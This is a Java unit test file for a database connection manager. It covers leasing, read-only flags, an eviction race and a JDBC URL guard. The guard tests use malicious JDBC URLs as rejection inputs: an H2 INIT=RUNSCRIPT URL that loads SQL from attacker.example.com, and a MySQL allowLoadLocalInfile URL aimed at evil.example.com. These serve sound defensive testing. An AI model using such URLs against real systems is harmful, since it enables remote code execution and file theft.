/*
 * Copyright 2024-2026 Embabel Pty Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.entropy.database.mcp.byok;

import com.entropy.database.mcp.dialect.DatabaseDialect;
import com.entropy.database.mcp.dialect.DialectResolver;
import com.entropy.database.mcp.exception.ErrorCode;
import com.entropy.database.mcp.exception.McpValidationException;
import com.entropy.database.mcp.monitor.McpMetricsCollector;
import com.entropy.database.mcp.properties.ByokProperties;
import com.entropy.database.mcp.security.DataMaskingService;
import com.entropy.database.mcp.security.QueryAuditLogger;
import com.entropy.database.mcp.security.SqlValidator;
import com.zaxxer.hikari.HikariDataSource;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.jdbc.core.JdbcTemplate;

import javax.sql.DataSource;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.Executor;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class DynamicDataSourceManagerImplTest {

    @Mock
    private DialectResolver dialectResolver;

    @Mock
    private ByokDataSourceFactory dataSourceFactory;

    @Mock
    private McpMetricsCollector metricsCollector;

    private DynamicDataSourceManagerImpl createManager() {
        return createManager(Duration.ofMinutes(30), null);
    }

    private DynamicDataSourceManagerImpl createManager(Duration leaseDuration, Executor cacheExecutor) {
        ByokProperties properties = new ByokProperties(
                leaseDuration,
                Duration.ofHours(2),
                Duration.ofMinutes(5),
                100,
                10,
                2
        );
        return new DynamicDataSourceManagerImpl(
                new DynamicDataSourceManagerImpl.Dependencies(
                        dialectResolver,
                        dataSourceFactory,
                        properties,
                        metricsCollector,
                        cacheExecutor
                )
        );
    }

    private static ConnectionProperties connection(String jdbcUrl, boolean readonly) {
        return ConnectionProperties.builder()
                .jdbcUrl(jdbcUrl)
                .username("user")
                .password("pass")
                .readonly(readonly)
                .build();
    }

    /**
     * Executor that holds every submitted task until the test releases it, so the asynchronous
     * Caffeine removal notification can be delivered <em>after</em> the connection has been rebuilt.
     * That is exactly the interleaving in which a by-name cleanup used to erase the fresh
     * connection's read-only flag.
     */
    private static final class DeferringExecutor implements Executor {
        private final List<Runnable> tasks = Collections.synchronizedList(new ArrayList<>());

        @Override
        public void execute(Runnable command) {
            tasks.add(command);
        }

        int pending() {
            return tasks.size();
        }

        void runAll() {
            List<Runnable> drained;
            synchronized (tasks) {
                drained = new ArrayList<>(tasks);
                tasks.clear();
            }
            drained.forEach(Runnable::run);
        }
    }


    @Test
    void acquireNewConnection() {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties connection = ConnectionProperties.builder()
                .jdbcUrl("jdbc:mysql://localhost:3306/test")
                .username("user")
                .password("pass")
                .dialect("mysql")
                .driverClassName("com.mysql.cj.jdbc.Driver")
                .build();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("key1", connection, dialect)).thenReturn(context);
        when(context.getKey()).thenReturn("key1");

        ByokDataSourceContext result = manager.acquire("key1", connection);

        assertThat(result).isNotNull();
        assertThat(result.getKey()).isEqualTo("key1");
        assertThat(manager.getActiveConnectionCount()).isEqualTo(1);
    }

    @Test
    void isReadonlyReflectsRegisteredConnectionFlag() {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties readonlyConnection = ConnectionProperties.builder()
                .jdbcUrl("jdbc:mysql://localhost:3306/test")
                .username("user")
                .password("pass")
                .dialect("mysql")
                .driverClassName("com.mysql.cj.jdbc.Driver")
                .readonly(true)
                .build();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("ro", readonlyConnection, dialect)).thenReturn(context);

        manager.acquire("ro", readonlyConnection);

        assertThat(manager.isReadonly("ro")).isTrue();
        assertThat(manager.isReadonly("never-registered")).isFalse();
    }

    @Test
    void isReadonlyIsFalseForWritableConnection() {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties connection = ConnectionProperties.builder()
                .jdbcUrl("jdbc:mysql://localhost:3306/test")
                .username("user")
                .password("pass")
                .dialect("mysql")
                .driverClassName("com.mysql.cj.jdbc.Driver")
                .build();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("rw", connection, dialect)).thenReturn(context);

        manager.acquire("rw", connection);

        assertThat(manager.isReadonly("rw")).isFalse();
    }

    @Test
    void acquireExistingConnection() {        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties connection = ConnectionProperties.builder()
                .jdbcUrl("jdbc:mysql://localhost:3306/test")
                .username("user")
                .password("pass")
                .dialect("mysql")
                .driverClassName("com.mysql.cj.jdbc.Driver")
                .build();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("key1", connection, dialect)).thenReturn(context);

        // First acquire - creates new connection
        manager.acquire("key1", connection);

        // Second acquire - should return existing connection
        ByokDataSourceContext result = manager.acquire("key1", connection);

        assertThat(result).isNotNull();
        assertThat(manager.getActiveConnectionCount()).isEqualTo(1);
    }

    @Test
    void acquireExistingKeyThrowsWhenNotFound() {
        DynamicDataSourceManagerImpl manager = createManager();

        assertThrows(IllegalArgumentException.class, () -> manager.acquire("nonexistent"));
    }

    @Test
    void acquireExistingKeyReturnsContext() {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties connection = ConnectionProperties.builder()
                .jdbcUrl("jdbc:mysql://localhost:3306/test")
                .username("user")
                .password("pass")
                .dialect("mysql")
                .driverClassName("com.mysql.cj.jdbc.Driver")
                .build();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("key1", connection, dialect)).thenReturn(context);

        manager.acquire("key1", connection);
        ByokDataSourceContext result = manager.acquire("key1");

        assertThat(result).isNotNull();
    }

    @Test
    void registerExistingDataSource() {
        DynamicDataSourceManagerImpl manager = createManager();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        DataSource dataSource = mock(DataSource.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dataSourceFactory.createExisting(anyString(), any(DataSource.class), any(DatabaseDialect.class))).thenReturn(context);

        manager.registerExisting("primary", dataSource, dialect);

        assertThat(manager.getActiveConnectionCount()).isEqualTo(1);
        assertThat(manager.getConnectionCount()).isEqualTo(1);
        assertThat(manager.listConnectionKeys()).containsExactly("primary");
    }

    @Test
    void shutdownClearsAll() {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties connection = ConnectionProperties.builder()
                .jdbcUrl("jdbc:mysql://localhost:3306/test")
                .username("user")
                .password("pass")
                .dialect("mysql")
                .driverClassName("com.mysql.cj.jdbc.Driver")
                .build();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("key1", connection, dialect)).thenReturn(context);

        manager.acquire("key1", connection);
        assertThat(manager.getActiveConnectionCount()).isEqualTo(1);

        manager.shutdown();

        assertThat(manager.getActiveConnectionCount()).isEqualTo(0);
        assertThat(manager.getConnectionCount()).isEqualTo(0);
    }

    @Test
    void getConnectionMetadataForRegisteredConnection() {
        DynamicDataSourceManagerImpl manager = createManager();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        DataSource dataSource = mock(DataSource.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dataSourceFactory.createExisting(anyString(), any(DataSource.class), any(DatabaseDialect.class))).thenReturn(context);

        manager.registerExisting("primary", dataSource, dialect);

        ConnectionMetadata metadata = manager.getConnectionMetadata("primary");
        assertThat(metadata).isNotNull();
        assertThat(metadata.key()).isEqualTo("primary");
    }

    @Test
    void getConnectionMetadataReturnsNullForBlankKey() {
        DynamicDataSourceManagerImpl manager = createManager();

        assertThat(manager.getConnectionMetadata(null)).isNull();
        assertThat(manager.getConnectionMetadata("")).isNull();
        assertThat(manager.getConnectionMetadata("  ")).isNull();
    }

    @Test
    void maskKeyWithPassword() {
        DynamicDataSourceManagerImpl manager = createManager();

        try {
            java.lang.reflect.Method method = DynamicDataSourceManagerImpl.class.getDeclaredMethod("maskKey", String.class);
            method.setAccessible(true);
            String result = (String) method.invoke(manager, "jdbc:mysql://user:secret@localhost:3306/test");
            assertThat(result).isEqualTo("jdbc:mysql://****@localhost:3306/test");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Test
    void maskKeyWithoutPassword() {
        DynamicDataSourceManagerImpl manager = createManager();

        try {
            java.lang.reflect.Method method = DynamicDataSourceManagerImpl.class.getDeclaredMethod("maskKey", String.class);
            method.setAccessible(true);
            String result = (String) method.invoke(manager, "jdbc:mysql://localhost:3306/test");
            assertThat(result).isEqualTo("jdbc:mysql://localhost:3306/test");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Test
    void maskKeyNull() {
        DynamicDataSourceManagerImpl manager = createManager();

        try {
            java.lang.reflect.Method method = DynamicDataSourceManagerImpl.class.getDeclaredMethod("maskKey", String.class);
            method.setAccessible(true);
            String result = (String) method.invoke(manager, (Object) null);
            assertThat(result).isEqualTo("null");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    // ─── lease eviction must not disarm a rebuilt read-only connection ──────

    /**
     * Reproduces the exact interleaving that used to turn a read-only connection into a writable one:
     * the lease expires, Caffeine queues the removal notification on another thread, the caller rebuilds
     * the connection under the same name, and only then does the stale notification run.
     */
    @Test
    void readonlyFlagSurvivesLateEvictionCallbackAfterRebuild() throws InterruptedException {
        DeferringExecutor cacheExecutor = new DeferringExecutor();
        DynamicDataSourceManagerImpl manager = createManager(Duration.ofMillis(10), cacheExecutor);
        ConnectionProperties readonly = connection("jdbc:mysql://localhost:3306/test", true);
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext first = mock(ByokDataSourceContext.class);
        ByokDataSourceContext second = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("ro", readonly, dialect)).thenReturn(first, second);

        manager.acquire("ro", readonly);
        assertThat(manager.isReadonly("ro")).isTrue();

        // Lease expires; cleanUp evicts the entry and queues the removal notification.
        Thread.sleep(50);
        manager.evictExpired();
        assertThat(cacheExecutor.pending())
                .withFailMessage("expected Caffeine to queue the removal notification, "
                        + "otherwise this test no longer reproduces the late-callback race")
                .isPositive();

        // Business thread rebuilds the connection before the notification is delivered.
        manager.acquire("ro", readonly);
        assertThat(manager.isReadonly("ro")).isTrue();

        // The stale notification for the *previous* datasource finally runs.
        cacheExecutor.runAll();

        assertThat(manager.isReadonly("ro")).isTrue();
        assertThat(manager.getConnectionMetadata("ro")).isNotNull();
        assertThat(manager.listConnectionKeys()).contains("ro");
        assertThat(manager.getActiveConnectionCount()).isEqualTo(1);
        // The fingerprint index must still resolve to the rebuilt pool, otherwise the same physical
        // database would get a second pool under the next alias.
        assertThat(fingerprintIndexOf(manager)).containsValue("ro");
    }

    @Test
    void evictionCallbackClearsStateWhenNothingIsRebuilt() throws InterruptedException {
        DeferringExecutor cacheExecutor = new DeferringExecutor();
        DynamicDataSourceManagerImpl manager = createManager(Duration.ofMillis(10), cacheExecutor);
        ConnectionProperties props = connection("jdbc:mysql://localhost:3306/test", true);
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve("mysql", null)).thenReturn(dialect);
        when(dataSourceFactory.create("ro", props, dialect)).thenReturn(context);

        manager.acquire("ro", props);
        Thread.sleep(50);
        manager.evictExpired();
        cacheExecutor.runAll();

        assertThat(manager.getConnectionMetadata("ro")).isNull();
        assertThat(manager.isReadonly("ro")).isFalse();
        assertThat(manager.listConnectionKeys()).doesNotContain("ro");
        assertThat(fingerprintIndexOf(manager)).isEmpty();
    }

    @SuppressWarnings("unchecked")
    private static java.util.Map<String, String> fingerprintIndexOf(DynamicDataSourceManagerImpl manager) {
        try {
            java.lang.reflect.Field field =
                    DynamicDataSourceManagerImpl.class.getDeclaredField("contentFingerprintToKey");
            field.setAccessible(true);
            return (java.util.Map<String, String>) field.get(manager);
        } catch (ReflectiveOperationException e) {
            throw new IllegalStateException(e);
        }
    }

    // ─── JDBC URL guard ─────────────────────────────────────────────────────

    @Test
    void rejectsH2InitRunscriptUrl() {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties malicious = connection(
                "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example.com/x.sql'", false);

        McpValidationException failure = assertThrows(McpValidationException.class,
                () -> manager.acquire("rce", malicious));

        assertThat(failure.getErrorCode()).isEqualTo(ErrorCode.PARAMETER_VALIDATION_FAILED);
        assertThat(failure.getMessage())
                .contains("init")
                .doesNotContain("attacker.example.com");
        verifyNoInteractions(dataSourceFactory);
        assertThat(manager.getConnectionCount()).isZero();
    }

    @Test
    void rejectsMySqlAllowLoadLocalInfileUrl() {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties malicious = connection(
                "jdbc:mysql://evil.example.com/db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true", false);

        McpValidationException failure = assertThrows(McpValidationException.class,
                () -> manager.acquire("file-read", malicious));

        assertThat(failure.getErrorCode()).isEqualTo(ErrorCode.PARAMETER_VALIDATION_FAILED);
        assertThat(failure.getMessage()).contains("allowloadlocalinfile");
        verifyNoInteractions(dataSourceFactory);
        assertThat(manager.getConnectionCount()).isZero();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "jdbc:oracle:thin:@//oracle.example.com:1521/ORCLPDB1",
            "jdbc:mysql://mysql.example.com:3306/app?useSSL=true&serverTimezone=UTC",
            "jdbc:postgresql://pg.example.com:5432/app?ssl=true",
            "jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1"})
    void allowsOrdinaryUrlsWithTheDefaultGuard(String jdbcUrl) {
        DynamicDataSourceManagerImpl manager = createManager();
        ConnectionProperties props = connection(jdbcUrl, false);
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        ByokDataSourceContext context = mock(ByokDataSourceContext.class);

        when(dialectResolver.resolve(anyString(), isNull())).thenReturn(dialect);
        when(dataSourceFactory.create(anyString(), any(ConnectionProperties.class), any())).thenReturn(context);

        assertThat(manager.acquire("ok", props)).isNotNull();
        assertThat(manager.getConnectionCount()).isEqualTo(1);
    }

    @Test
    void registerExistingIsGuardedWhenTheJdbcUrlCanBeDetermined() {
        DynamicDataSourceManagerImpl manager = createManager();
        DatabaseDialect dialect = mock(DatabaseDialect.class);
        HikariDataSource hikari = mock(HikariDataSource.class);

        when(hikari.getJdbcUrl())
                .thenReturn("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example.com/x.sql'");

        assertThatThrownBy(() -> manager.registerExisting("external", hikari, dialect))
                .isInstanceOf(McpValidationException.class)
                .hasMessageContaining("init");

        assertThat(manager.getConnectionCount()).isZero();
        verifyNoInteractions(dataSourceFactory);
    }
}


